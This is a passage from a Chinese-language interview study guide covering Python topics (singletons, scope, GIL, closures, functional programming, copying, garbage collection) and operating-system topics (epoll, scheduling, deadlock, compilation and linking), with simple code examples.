MyClass:\n  ...\n```\n\n### 4 import\u65b9\u6cd5\n\n\u4f5c\u4e3apython\u7684\u6a21\u5757\u662f\u5929\u7136\u7684\u5355\u4f8b\u6a21\u5f0f\n\n```python\n# mysingleton.py\nclass My_Singleton(object):\n    def foo(self):\n        pass\n\nmy_singleton = My_Singleton()\n\n# to use\nfrom mysingleton import my_singleton\n\nmy_singleton.foo()\n\n```\n**[\u5355\u4f8b\u6a21\u5f0f\u4f2f\u4e50\u5728\u7ebf\u8be6\u7ec6\u89e3\u91ca](http:\/\/python.jobbole.com\/87294\/)**\n\n## 17 Python\u4e2d\u7684\u4f5c\u7528\u57df\n\nPython \u4e2d\uff0c\u4e00\u4e2a\u53d8\u91cf\u7684\u4f5c\u7528\u57df\u603b\u662f\u7531\u5728\u4ee3\u7801\u4e2d\u88ab\u8d4b\u503c\u7684\u5730\u65b9\u6240\u51b3\u5b9a\u7684\u3002\n\n\u5f53 Python \u9047\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u8bdd\u4ed6\u4f1a\u6309\u7167\u8fd9\u6837\u7684\u987a\u5e8f\u8fdb\u884c\u641c\u7d22\uff1a\n\n\u672c\u5730\u4f5c\u7528\u57df\uff08Local\uff09\u2192\u5f53\u524d\u4f5c\u7528\u57df\u88ab\u5d4c\u5165\u7684\u672c\u5730\u4f5c\u7528\u57df\uff08Enclosing locals\uff09\u2192\u5168\u5c40\/\u6a21\u5757\u4f5c\u7528\u57df\uff08Global\uff09\u2192\u5185\u7f6e\u4f5c\u7528\u57df\uff08Built-in\uff09\n\n## 18 GIL\u7ebf\u7a0b\u5168\u5c40\u9501\n\n\u7ebf\u7a0b\u5168\u5c40\u9501(Global Interpreter Lock),\u5373Python\u4e3a\u4e86\u4fdd\u8bc1\u7ebf\u7a0b\u5b89\u5168\u800c\u91c7\u53d6\u7684\u72ec\u7acb\u7ebf\u7a0b\u8fd0\u884c\u7684\u9650\u5236,\u8bf4\u767d\u4e86\u5c31\u662f\u4e00\u4e2a\u6838\u53ea\u80fd\u5728\u540c\u4e00\u65f6\u95f4\u8fd0\u884c\u4e00\u4e2a\u7ebf\u7a0b.**\u5bf9\u4e8eio\u5bc6\u96c6\u578b\u4efb\u52a1\uff0cpython\u7684\u591a\u7ebf\u7a0b\u8d77\u5230\u4f5c\u7528\uff0c\u4f46\u5bf9\u4e8ecpu\u5bc6\u96c6\u578b\u4efb\u52a1\uff0cpython\u7684\u591a\u7ebf\u7a0b\u51e0\u4e4e\u5360\u4e0d\u5230\u4efb\u4f55\u4f18\u52bf\uff0c\u8fd8\u6709\u53ef\u80fd\u56e0\u4e3a\u4e89\u593a\u8d44\u6e90\u800c\u53d8\u6162\u3002**\n\n\u89c1[Python \u6700\u96be\u7684\u95ee\u9898](http:\/\/www.oschina.net\/translate\/pythons-hardest-problem)\n\n\u89e3\u51b3\u529e\u6cd5\u5c31\u662f\u591a\u8fdb\u7a0b\u548c\u4e0b\u9762\u7684\u534f\u7a0b(\u534f\u7a0b\u4e5f\u53ea\u662f\u5355CPU,\u4f46\u662f\u80fd\u51cf\u5c0f\u5207\u6362\u4ee3\u4ef7\u63d0\u5347\u6027\u80fd).\n\n## 19 \u534f\u7a0b\n\n\u77e5\u4e4e\u88ab\u95ee\u5230\u4e86,\u5475\u5475\u54d2,\u8dea\u4e86\n\n\u7b80\u5355\u70b9\u8bf4\u534f\u7a0b\u662f\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u7684\u5347\u7ea7\u7248,\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u90fd\u9762\u4e34\u7740\u5185\u6838\u6001\u548c\u7528\u6237\u6001\u7684\u5207\u6362\u95ee\u9898\u800c\u8017\u8d39\u8bb8\u591a\u5207\u6362\u65f6\u95f4,\u800c\u534f\u7a0b\u5c31\u662f\u7528\u6237\u81ea\u5df1\u63a7\u5236\u5207\u6362\u7684\u65f6\u673a,\u4e0d\u518d\u9700\u8981\u9677\u5165\u7cfb\u7edf\u7684\u5185\u6838\u6001.\n\nPython\u91cc\u6700\u5e38\u89c1\u7684yield\u5c31\u662f\u534f\u7a0b\u7684\u601d\u60f3!\u53ef\u4ee5\u67e5\u770b\u7b2c\u4e5d\u4e2a\u95ee\u9898.\n\n\n## 20 \u95ed\u5305\n\n\u95ed\u5305(closure)\u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u7684\u91cd\u8981\u7684\u8bed\u6cd5\u7ed3\u6784\u3002\u95ed\u5305\u4e5f\u662f\u4e00\u79cd\u7ec4\u7ec7\u4ee3\u7801\u7684\u7ed3\u6784\uff0c\u5b83\u540c\u6837\u63d0\u9ad8\u4e86\u4ee3\u7801\u7684\u53ef\u91cd\u590d\u4f7f\u7528\u6027\u3002\n\n\u5f53\u4e00\u4e2a\u5185\u5d4c\u51fd\u6570\u5f15\u7528\u5176\u5916\u90e8\u4f5c\u4f5c\u7528\u57df\u7684\u53d8\u91cf,\u6211\u4eec\u5c31\u4f1a\u5f97\u5230\u4e00\u4e2a\u95ed\u5305. \u603b\u7ed3\u4e00\u4e0b,\u521b\u5efa\u4e00\u4e2a\u95ed\u5305\u5fc5\u987b\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u70b9:\n\n1. \u5fc5\u987b\u6709\u4e00\u4e2a\u5185\u5d4c\u51fd\u6570\n2. \u5185\u5d4c\u51fd\u6570\u5fc5\u987b\u5f15\u7528\u5916\u90e8\u51fd\u6570\u4e2d\u7684\u53d8\u91cf\n3. \u5916\u90e8\u51fd\u6570\u7684\u8fd4\u56de\u503c\u5fc5\u987b\u662f\u5185\u5d4c\u51fd\u6570\n\n\u611f\u89c9\u95ed\u5305\u8fd8\u662f\u6709\u96be\u5ea6\u7684,\u51e0\u53e5\u8bdd\u662f\u8bf4\u4e0d\u660e\u767d\u7684,\u8fd8\u662f\u67e5\u67e5\u76f8\u5173\u8d44\u6599.\n\n\u91cd\u70b9\u662f\u51fd\u6570\u8fd0\u884c\u540e\u5e76\u4e0d\u4f1a\u88ab\u64a4\u9500,\u5c31\u50cf16\u9898\u7684instance\u5b57\u5178\u4e00\u6837,\u5f53\u51fd\u6570\u8fd0\u884c\u5b8c\u540e,instance\u5e76\u4e0d\u88ab\u9500\u6bc1,\u800c\u662f\u7ee7\u7eed\u7559\u5728\u5185\u5b58\u7a7a\u95f4\u91cc.\u8fd9\u4e2a\u529f\u80fd\u7c7b\u4f3c\u7c7b\u91cc\u7684\u7c7b\u53d8\u91cf,\u53ea\u4e0d\u8fc7\u8fc1\u79fb\u5230\u4e86\u51fd\u6570\u4e0a.\n\n\u95ed\u5305\u5c31\u50cf\u4e2a\u7a7a\u5fc3\u7403\u4e00\u6837,\u4f60\u77e5\u9053\u5916\u9762\u548c\u91cc\u9762,\u4f46\u4f60\u4e0d\u77e5\u9053\u4e2d\u95f4\u662f\u4ec0\u4e48\u6837.\n\n## 21 lambda\u51fd\u6570\n\n\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570,\u4e3a\u4ec0\u4e48\u53eblambda?\u56e0\u4e3a\u548c\u540e\u9762\u7684\u51fd\u6570\u5f0f\u7f16\u7a0b\u6709\u5173.\n\n\u63a8\u8350: [\u77e5\u4e4e](http:\/\/www.zhihu.com\/question\/20125256)\n\n\n## 22 Python\u51fd\u6570\u5f0f\u7f16\u7a0b\n\n\u8fd9\u4e2a\u9700\u8981\u9002\u5f53\u7684\u4e86\u89e3\u4e00\u4e0b\u5427,\u6bd5\u7adf\u51fd\u6570\u5f0f\u7f16\u7a0b\u5728Python\u4e2d\u4e5f\u505a\u4e86\u5f15\u7528.\n\n\u63a8\u8350: [\u9177\u58f3](http:\/\/coolshell.cn\/articles\/10822.html)\n\npython\u4e2d\u51fd\u6570\u5f0f\u7f16\u7a0b\u652f\u6301:\n\nfilter \u51fd\u6570\u7684\u529f\u80fd\u76f8\u5f53\u4e8e\u8fc7\u6ee4\u5668\u3002\u8c03\u7528\u4e00\u4e2a\u5e03\u5c14\u51fd\u6570`bool_func`\u6765\u8fed\u4ee3\u904d\u5386\u6bcf\u4e2aseq\u4e2d\u7684\u5143\u7d20\uff1b\u8fd4\u56de\u4e00\u4e2a\u4f7f`bool_seq`\u8fd4\u56de\u503c\u4e3atrue\u7684\u5143\u7d20\u7684\u5e8f\u5217\u3002\n\n```python\n>>>a = [1,2,3,4,5,6,7]\n>>>b = filter(lambda x: x > 5, a)\n>>>print b\n>>>[6,7]\n```\n\nmap\u51fd\u6570\u662f\u5bf9\u4e00\u4e2a\u5e8f\u5217\u7684\u6bcf\u4e2a\u9879\u4f9d\u6b21\u6267\u884c\u51fd\u6570\uff0c\u4e0b\u9762\u662f\u5bf9\u4e00\u4e2a\u5e8f\u5217\u6bcf\u4e2a\u9879\u90fd\u4e58\u4ee52\uff1a\n\n```python\n>>> a = map(lambda x:x*2,[1,2,3])\n>>> list(a)\n[2, 4, 6]\n```\n\nreduce\u51fd\u6570\u662f\u5bf9\u4e00\u4e2a\u5e8f\u5217\u7684\u6bcf\u4e2a\u9879\u8fed\u4ee3\u8c03\u7528\u51fd\u6570\uff0c\u4e0b\u9762\u662f\u6c423\u7684\u9636\u4e58\uff1a\n\n```python\n>>> reduce(lambda x,y:x*y,range(1,4))\n6\n```\n\n## 23 Python\u91cc\u7684\u62f7\u8d1d\n\n\u5f15\u7528\u548ccopy(),deepcopy()\u7684\u533a\u522b\n\n```python\nimport copy\na = [1, 2, 3, 4, ['a', 'b']]  #\u539f\u59cb\u5bf9\u8c61\n\nb = a  #\u8d4b\u503c\uff0c\u4f20\u5bf9\u8c61\u7684\u5f15\u7528\nc = copy.copy(a)  #\u5bf9\u8c61\u62f7\u8d1d\uff0c\u6d45\u62f7\u8d1d\nd = copy.deepcopy(a)  #\u5bf9\u8c61\u62f7\u8d1d\uff0c\u6df1\u62f7\u8d1d\n\na.append(5)  #\u4fee\u6539\u5bf9\u8c61a\na[4].append('c')  #\u4fee\u6539\u5bf9\u8c61a\u4e2d\u7684['a', 'b']\u6570\u7ec4\u5bf9\u8c61\n\nprint 'a = ', a\nprint 'b = ', b\nprint 'c = ', c\nprint 'd = ', d\n\n\u8f93\u51fa\u7ed3\u679c\uff1a\na =  [1, 2, 3, 4, ['a', 'b', 'c'], 5]\nb =  [1, 2, 3, 4, ['a', 'b', 'c'], 5]\nc =  [1, 2, 3, 4, ['a', 'b', 'c']]\nd =  [1, 2, 3, 4, ['a', 'b']]\n```\n\n## 24 Python\u5783\u573e\u56de\u6536\u673a\u5236\n\nPython GC\u4e3b\u8981\u4f7f\u7528\u5f15\u7528\u8ba1\u6570\uff08reference counting\uff09\u6765\u8ddf\u8e2a\u548c\u56de\u6536\u5783\u573e\u3002\u5728\u5f15\u7528\u8ba1\u6570\u7684\u57fa\u7840\u4e0a\uff0c\u901a\u8fc7\u201c\u6807\u8bb0-\u6e05\u9664\u201d\uff08mark and sweep\uff09\u89e3\u51b3\u5bb9\u5668\u5bf9\u8c61\u53ef\u80fd\u4ea7\u751f\u7684\u5faa\u73af\u5f15\u7528\u95ee\u9898\uff0c\u901a\u8fc7\u201c\u5206\u4ee3\u56de\u6536\u201d\uff08generation collection\uff09\u4ee5\u7a7a\u95f4\u6362\u65f6\u95f4\u7684\u65b9\u6cd5\u63d0\u9ad8\u5783\u573e\u56de\u6536\u6548\u7387\u3002\n\n### 1 \u5f15\u7528\u8ba1\u6570\n\nPyObject\u662f\u6bcf\u4e2a\u5bf9\u8c61\u5fc5\u6709\u7684\u5185\u5bb9\uff0c\u5176\u4e2d`ob_refcnt`\u5c31\u662f\u505a\u4e3a\u5f15\u7528\u8ba1\u6570\u3002\u5f53\u4e00\u4e2a\u5bf9\u8c61\u6709\u65b0\u7684\u5f15\u7528\u65f6\uff0c\u5b83\u7684`ob_refcnt`\u5c31\u4f1a\u589e\u52a0\uff0c\u5f53\u5f15\u7528\u5b83\u7684\u5bf9\u8c61\u88ab\u5220\u9664\uff0c\u5b83\u7684`ob_refcnt`\u5c31\u4f1a\u51cf\u5c11.\u5f15\u7528\u8ba1\u6570\u4e3a0\u65f6\uff0c\u8be5\u5bf9\u8c61\u751f\u547d\u5c31\u7ed3\u675f\u4e86\u3002\n\n\u4f18\u70b9:\n\n1. \u7b80\u5355\n2. \u5b9e\u65f6\u6027\n\n\u7f3a\u70b9:\n\n1. \u7ef4\u62a4\u5f15\u7528\u8ba1\u6570\u6d88\u8017\u8d44\u6e90\n2. \u5faa\u73af\u5f15\u7528\n\n### 2 \u6807\u8bb0-\u6e05\u9664\u673a\u5236\n\n\u57fa\u672c\u601d\u8def\u662f\u5148\u6309\u9700\u5206\u914d\uff0c\u7b49\u5230\u6ca1\u6709\u7a7a\u95f2\u5185\u5b58\u7684\u65f6\u5019\u4ece\u5bc4\u5b58\u5668\u548c\u7a0b\u5e8f\u6808\u4e0a\u7684\u5f15\u7528\u51fa\u53d1\uff0c\u904d\u5386\u4ee5\u5bf9\u8c61\u4e3a\u8282\u70b9\u3001\u4ee5\u5f15\u7528\u4e3a\u8fb9\u6784\u6210\u7684\u56fe\uff0c\u628a\u6240\u6709\u53ef\u4ee5\u8bbf\u95ee\u5230\u7684\u5bf9\u8c61\u6253\u4e0a\u6807\u8bb0\uff0c\u7136\u540e\u6e05\u626b\u4e00\u904d\u5185\u5b58\u7a7a\u95f4\uff0c\u628a\u6240\u6709\u6ca1\u6807\u8bb0\u7684\u5bf9\u8c61\u91ca\u653e\u3002\n\n### 3 \u5206\u4ee3\u6280\u672f\n\n\u5206\u4ee3\u56de\u6536\u7684\u6574\u4f53\u601d\u60f3\u662f\uff1a\u5c06\u7cfb\u7edf\u4e2d\u7684\u6240\u6709\u5185\u5b58\u5757\u6839\u636e\u5176\u5b58\u6d3b\u65f6\u95f4\u5212\u5206\u4e3a\u4e0d\u540c\u7684\u96c6\u5408\uff0c\u6bcf\u4e2a\u96c6\u5408\u5c31\u6210\u4e3a\u4e00\u4e2a\u201c\u4ee3\u201d\uff0c\u5783\u573e\u6536\u96c6\u9891\u7387\u968f\u7740\u201c\u4ee3\u201d\u7684\u5b58\u6d3b\u65f6\u95f4\u7684\u589e\u5927\u800c\u51cf\u5c0f\uff0c\u5b58\u6d3b\u65f6\u95f4\u901a\u5e38\u5229\u7528\u7ecf\u8fc7\u51e0\u6b21\u5783\u573e\u56de\u6536\u6765\u5ea6\u91cf\u3002\n\nPython\u9ed8\u8ba4\u5b9a\u4e49\u4e86\u4e09\u4ee3\u5bf9\u8c61\u96c6\u5408\uff0c\u7d22\u5f15\u6570\u8d8a\u5927\uff0c\u5bf9\u8c61\u5b58\u6d3b\u65f6\u95f4\u8d8a\u957f\u3002\n\n\u4e3e\u4f8b\uff1a\n\u5f53\u67d0\u4e9b\u5185\u5b58\u5757M\u7ecf\u8fc7\u4e863\u6b21\u5783\u573e\u6536\u96c6\u7684\u6e05\u6d17\u4e4b\u540e\u8fd8\u5b58\u6d3b\u65f6\uff0c\u6211\u4eec\u5c31\u5c06\u5185\u5b58\u5757M\u5212\u5230\u4e00\u4e2a\u96c6\u5408A\u4e2d\u53bb\uff0c\u800c\u65b0\u5206\u914d\u7684\u5185\u5b58\u90fd\u5212\u5206\u5230\u96c6\u5408B\u4e2d\u53bb\u3002\u5f53\u5783\u573e\u6536\u96c6\u5f00\u59cb\u5de5\u4f5c\u65f6\uff0c\u5927\u591a\u6570\u60c5\u51b5\u90fd\u53ea\u5bf9\u96c6\u5408B\u8fdb\u884c\u5783\u573e\u56de\u6536\uff0c\u800c\u5bf9\u96c6\u5408A\u8fdb\u884c\u5783\u573e\u56de\u6536\u8981\u9694\u76f8\u5f53\u957f\u4e00\u6bb5\u65f6\u95f4\u540e\u624d\u8fdb\u884c\uff0c\u8fd9\u5c31\u4f7f\u5f97\u5783\u573e\u6536\u96c6\u673a\u5236\u9700\u8981\u5904\u7406\u7684\u5185\u5b58\u5c11\u4e86\uff0c\u6548\u7387\u81ea\u7136\u5c31\u63d0\u9ad8\u4e86\u3002\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u96c6\u5408B\u4e2d\u7684\u67d0\u4e9b\u5185\u5b58\u5757\u7531\u4e8e\u5b58\u6d3b\u65f6\u95f4\u957f\u800c\u4f1a\u88ab\u8f6c\u79fb\u5230\u96c6\u5408A\u4e2d\uff0c\u5f53\u7136\uff0c\u96c6\u5408A\u4e2d\u5b9e\u9645\u4e0a\u4e5f\u5b58\u5728\u4e00\u4e9b\u5783\u573e\uff0c\u8fd9\u4e9b\u5783\u573e\u7684\u56de\u6536\u4f1a\u56e0\u4e3a\u8fd9\u79cd\u5206\u4ee3\u7684\u673a\u5236\u800c\u88ab\u5ef6\u8fdf\u3002\n\n## 25 Python\u7684List\n\n\u63a8\u8350: http:\/\/www.jianshu.com\/p\/J4U6rR\n\n## 26 Python\u7684is\n\nis\u662f\u5bf9\u6bd4\u5730\u5740,==\u662f\u5bf9\u6bd4\u503c\n\n## 27 read,readline\u548creadlines\n\n* read        \u8bfb\u53d6\u6574\u4e2a\u6587\u4ef6\n* readline    \u8bfb\u53d6\u4e0b\u4e00\u884c,\u4f7f\u7528\u751f\u6210\u5668\u65b9\u6cd5\n* readlines   \u8bfb\u53d6\u6574\u4e2a\u6587\u4ef6\u5230\u4e00\u4e2a\u8fed\u4ee3\u5668\u4ee5\u4f9b\u6211\u4eec\u904d\u5386\n\n## 28 Python2\u548c3\u7684\u533a\u522b\n\u63a8\u8350\uff1a[Python 2.7.x \u4e0e Python 3.x \u7684\u4e3b\u8981\u5dee\u5f02](http:\/\/chenqx.github.io\/2014\/11\/10\/Key-differences-between-Python-2-7-x-and-Python-3-x\/)\n\n## 29 super init\nsuper() lets you avoid referring to the base class explicitly, which can be nice. But the main advantage comes with multiple inheritance, where all sorts of fun stuff can happen. See the standard docs on super if you haven't already.\n\nNote that the syntax changed in Python 3.0: you can just say super().`__init__`() instead of super(ChildB, self).`__init__`() which IMO is quite a bit nicer.\n\nhttp:\/\/stackoverflow.com\/questions\/576169\/understanding-python-super-with-init-methods\n\n[Python2.7\u4e2d\u7684super\u65b9\u6cd5\u6d45\u89c1](http:\/\/blog.csdn.net\/mrlevo520\/article\/details\/51712440)\n\n## 30 range and xrange\n\u90fd\u5728\u5faa\u73af\u65f6\u4f7f\u7528\uff0cxrange\u5185\u5b58\u6027\u80fd\u66f4\u597d\u3002\nfor i in range(0, 20):\nfor i in xrange(0, 20):\nWhat is the difference between range and xrange functions in Python 2.X?\n range creates a list, so if you do range(1, 10000000) it creates a list in memory with 9999999 elements.\n xrange is a sequence object that evaluates lazily.\n\nhttp:\/\/stackoverflow.com\/questions\/94935\/what-is-the-difference-between-range-and-xrange-functions-in-python-2-x\n\n# \u64cd\u4f5c\u7cfb\u7edf\n\n## 1 select,poll\u548cepoll\n\n\u5176\u5b9e\u6240\u6709\u7684I\/O\u90fd\u662f\u8f6e\u8be2\u7684\u65b9\u6cd5,\u53ea\u4e0d\u8fc7\u5b9e\u73b0\u7684\u5c42\u9762\u4e0d\u540c\u7f62\u4e86.\n\n\u8fd9\u4e2a\u95ee\u9898\u53ef\u80fd\u6709\u70b9\u6df1\u5165\u4e86,\u4f46\u76f8\u4fe1\u80fd\u56de\u7b54\u51fa\u8fd9\u4e2a\u95ee\u9898\u662f\u5bf9I\/O\u591a\u8def\u590d\u7528\u6709\u5f88\u597d\u7684\u4e86\u89e3\u4e86.\u5176\u4e2dtornado\u4f7f\u7528\u7684\u5c31\u662fepoll\u7684.\n\n[selec,poll\u548cepoll\u533a\u522b\u603b\u7ed3](http:\/\/www.cnblogs.com\/Anker\/p\/3265058.html)\n\n\u57fa\u672c\u4e0aselect\u67093\u4e2a\u7f3a\u70b9:\n\n1. \u8fde\u63a5\u6570\u53d7\u9650\n2. \u67e5\u627e\u914d\u5bf9\u901f\u5ea6\u6162\n3. \u6570\u636e\u7531\u5185\u6838\u62f7\u8d1d\u5230\u7528\u6237\u6001\n\npoll\u6539\u5584\u4e86\u7b2c\u4e00\u4e2a\u7f3a\u70b9\n\nepoll\u6539\u4e86\u4e09\u4e2a\u7f3a\u70b9.\n\n\u5173\u4e8eepoll\u7684: http:\/\/www.cnblogs.com\/my_life\/articles\/3968782.html\n\n## 2 \u8c03\u5ea6\u7b97\u6cd5\n\n1. \u5148\u6765\u5148\u670d\u52a1(FCFS, First Come First Serve)\n2. \u77ed\u4f5c\u4e1a\u4f18\u5148(SJF, Shortest Job First)\n3. \u6700\u9ad8\u4f18\u5148\u6743\u8c03\u5ea6(Priority Scheduling)\n4. \u65f6\u95f4\u7247\u8f6e\u8f6c(RR, Round Robin)\n5. \u591a\u7ea7\u53cd\u9988\u961f\u5217\u8c03\u5ea6(multilevel feedback queue scheduling)\n\n\u5e38\u89c1\u7684\u8c03\u5ea6\u7b97\u6cd5\u603b\u7ed3:http:\/\/www.jianshu.com\/p\/6edf8174c1eb\n\n\u5b9e\u65f6\u8c03\u5ea6\u7b97\u6cd5:\n\n1. \u6700\u65e9\u622a\u81f3\u65f6\u95f4\u4f18\u5148 EDF\n2. \u6700\u4f4e\u677e\u5f1b\u5ea6\u4f18\u5148 LLF\n\n## 3 \u6b7b\u9501\n\u539f\u56e0:\n\n1. \u7ade\u4e89\u8d44\u6e90\n2. \u7a0b\u5e8f\u63a8\u8fdb\u987a\u5e8f\u4e0d\u5f53\n\n\u5fc5\u8981\u6761\u4ef6:\n\n1. \u4e92\u65a5\u6761\u4ef6\n2. \u8bf7\u6c42\u548c\u4fdd\u6301\u6761\u4ef6\n3. \u4e0d\u5265\u593a\u6761\u4ef6\n4. \u73af\u8def\u7b49\u5f85\u6761\u4ef6\n\n\u5904\u7406\u6b7b\u9501\u57fa\u672c\u65b9\u6cd5:\n\n1. \u9884\u9632\u6b7b\u9501(\u6452\u5f03\u96641\u4ee5\u5916\u7684\u6761\u4ef6)\n2. \u907f\u514d\u6b7b\u9501(\u94f6\u884c\u5bb6\u7b97\u6cd5)\n3. \u68c0\u6d4b\u6b7b\u9501(\u8d44\u6e90\u5206\u914d\u56fe)\n4. \u89e3\u9664\u6b7b\u9501\n    1. \u5265\u593a\u8d44\u6e90\n    2. \u64a4\u9500\u8fdb\u7a0b\n\n\u6b7b\u9501\u6982\u5ff5\u5904\u7406\u7b56\u7565\u8be6\u7ec6\u4ecb\u7ecd:https:\/\/wizardforcel.gitbooks.io\/wangdaokaoyan-os\/content\/10.html\n\n## 4 \u7a0b\u5e8f\u7f16\u8bd1\u4e0e\u94fe\u63a5\n\n\u63a8\u8350: http:\/\/www.ruanyifeng.com\/blog\/2014\/11\/compiler.html\n\nBulid\u8fc7\u7a0b\u53ef\u4ee5\u5206\u89e3\u4e3a4\u4e2a\u6b65\u9aa4:\u9884\u5904\u7406(Prepressing), \u7f16\u8bd1(Compilation)\u3001\u6c47\u7f16(Assembly)\u3001\u94fe\u63a5(Linking)\n\n\u4ee5c\u8bed\u8a00\u4e3a\u4f8b:\n\n### 1 \u9884\u5904\u7406\n\n\u9884\u7f16\u8bd1\u8fc7\u7a0b\u4e3b\u8981\u5904\u7406\u90a3\u4e9b\u6e90\u6587\u4ef6\u4e2d\u7684\u4ee5\u201c#\u201d\u5f00\u59cb\u7684\u9884\u7f16\u8bd1\u6307\u4ee4\uff0c\u4e3b\u8981\u5904\u7406\u89c4\u5219\u6709\uff1a\n\n1. \u5c06\u6240\u6709\u7684\u201c#define\u201d\u5220\u9664\uff0c\u5e76\u5c55\u5f00\u6240\u7528\u7684\u5b8f\u5b9a\u4e49\n2. \u5904\u7406\u6240\u6709\u6761\u4ef6\u9884\u7f16\u8bd1\u6307\u4ee4\uff0c\u6bd4\u5982\u201c#if\u201d\u3001\u201c#ifdef\u201d\u3001 \u201c#elif\u201d\u3001\u201c#endif\u201d\n3. \u5904\u7406\u201c#include\u201d\u9884\u7f16\u8bd1\u6307\u4ee4\uff0c\u5c06\u88ab\u5305\u542b\u7684\u6587\u4ef6\u63d2\u5165\u5230\u8be5\u7f16\u8bd1\u6307\u4ee4\u7684\u4f4d\u7f6e\uff0c\u6ce8\uff1a\u6b64\u8fc7\u7a0b\u662f\u9012\u5f52\u8fdb\u884c\u7684\n4. \u5220\u9664\u6240\u6709\u6ce8\u91ca\n5. \u6dfb\u52a0\u884c\u53f7\u548c\u6587\u4ef6\u540d\u6807\u8bc6\uff0c\u4ee5\u4fbf\u4e8e\u7f16\u8bd1\u65f6\u7f16\u8bd1\u5668\u4ea7\u751f\u8c03\u8bd5\u7528\u7684\u884c\u53f7\u4fe1\u606f\u4ee5\u53ca\u7528\u4e8e\u7f16\u8bd1\u65f6\u4ea7\u751f\u7f16\u8bd1\u9519\u8bef\u6216\u8b66\u544a\u65f6\u53ef\u663e\u793a\u884c\u53f7\n6. \u4fdd\u7559\u6240\u6709\u7684#pragma\u7f16\u8bd1\u5668\u6307\u4ee4\u3002\n\n### 2 \u7f16\u8bd1\n\n\u7f16\u8bd1\u8fc7\u7a0b\u5c31\u662f\u628a\u9884\u5904\u7406\u5b8c\u7684\u6587\u4ef6\u8fdb\u884c\u4e00\u7cfb\u5217\u7684\u8bcd\u6cd5\u5206\u6790\u3001\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u53ca\u4f18\u5316\u540e\u751f\u6210\u76f8\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\u6587\u4ef6\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u6574\u4e2a\u7a0b\u5e8f\u6784\u5efa\u7684\u6838\u5fc3\u90e8\u5206\u3002\n\n### 3 \u6c47\u7f16\n\n\u6c47\u7f16\u5668\u662f\u5c06\u6c47\u7f16\u4ee3\u7801\u8f6c\u5316\u6210\u673a\u5668\u53ef\u4ee5\u6267\u884c\u7684\u6307\u4ee4\uff0c\u6bcf\u4e00\u6761\u6c47\u7f16\u8bed\u53e5\u51e0\u4e4e\u90fd\u662f\u4e00\u6761\u673a\u5668\u6307\u4ee4\u3002\u7ecf\u8fc7\u7f16\u8bd1\u3001\u94fe\u63a5\u3001\u6c47\u7f16\u8f93\u51fa\u7684\u6587\u4ef6\u6210\u4e3a\u76ee\u6807\u6587\u4ef6(Object File)\n\n### 4 \u94fe\u63a5\n\n\u94fe\u63a5\u7684\u4e3b\u8981\u5185\u5bb9\u5c31\u662f\u628a\u5404\u4e2a\u6a21\u5757\u4e4b\u95f4\u76f8\u4e92\u5f15\u7528\u7684\u90e8\u5206\u5904\u7406\u597d\uff0c\u4f7f\u5404\u4e2a\u6a21\u5757\u53ef\u4ee5\u6b63\u786e\u7684\u62fc\u63a5\u3002\n\u94fe\u63a5\u7684\u4e3b\u8981\u8fc7\u7a0b\u5305\u5757 \u5730\u5740\u548c\u7a7a\u95f4\u7684\u5206\u914d\uff08Address and Storage Allocation\uff09\u3001\u7b26\u53f7\u51b3\u8bae(Symbol Resolution)\u548c\u91cd\u5b9a\u4f4d(Relocation)\u7b49\u6b65\u9aa4\u3002\n\n## 5 \u9759\u6001\u94fe\u63a5\u548c\u52a8\u6001\u94fe\u63a5\n\n\u9759\u6001\u94fe\u63a5\u65b9\u6cd5\uff1a\u9759\u6001\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u8f7d\u5165\u4ee3\u7801\u5c31\u4f1a\u628a\u7a0b\u5e8f\u4f1a\u7528\u5230\u7684\u52a8\u6001\u4ee3\u7801\u6216\u52a8\u6001\u4ee3\u7801\u7684\u5730\u5740\u786e\u5b9a\u4e0b\u6765\n\u9759\u6001\u5e93\u7684\u94fe\u63a5\u53ef\u4ee5\u4f7f\u7528\u9759\u6001\u94fe\u63a5\uff0c\u52a8\u6001\u94fe\u63a5\u5e93\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\u94fe\u63a5\u5bfc\u5165\u5e93\n\n\u52a8\u6001\u94fe\u63a5\u65b9\u6cd5\uff1a\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u7684\u7a0b\u5e8f\u5e76\u4e0d\u5728\u4e00\u5f00\u59cb\u5c31\u5b8c\u6210\u52a8\u6001\u94fe\u63a5\uff0c\u800c\u662f\u76f4\u5230\u771f\u6b63\u8c03\u7528\u52a8\u6001\u5e93\u4ee3\u7801\u65f6\uff0c\u8f7d\u5165\u7a0b\u5e8f\u624d\u8ba1\u7b97(\u88ab\u8c03\u7528\u7684\u90a3\u90e8\u5206)\u52a8\u6001\u4ee3\u7801\u7684\u903b\u8f91\u5730\u5740\uff0c\u7136\u540e\u7b49\u5230\u67d0\u4e2a\u65f6\u5019\uff0c\u7a0b\u5e8f\u53c8\u9700\u8981\u8c03\u7528\u53e6\u5916\u67d0\u5757\u52a8\u6001\u4ee3\u7801\u65f6\uff0c\u8f7d\u5165\u7a0b\u5e8f\u53c8\u53bb\u8ba1\u7b97\u8fd9\u90e8\u5206\u4ee3\u7801\u7684\u903b\u8f91\u5730\u5740\uff0c\u6240\u4ee5\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4f7f\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u95f4\u8f83\u77ed\uff0c\u4f46\u8fd0\u884c\u671f\u95f4\u7684\u6027\u80fd\u6bd4\u4e0d\u4e0a\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\n\n## 6 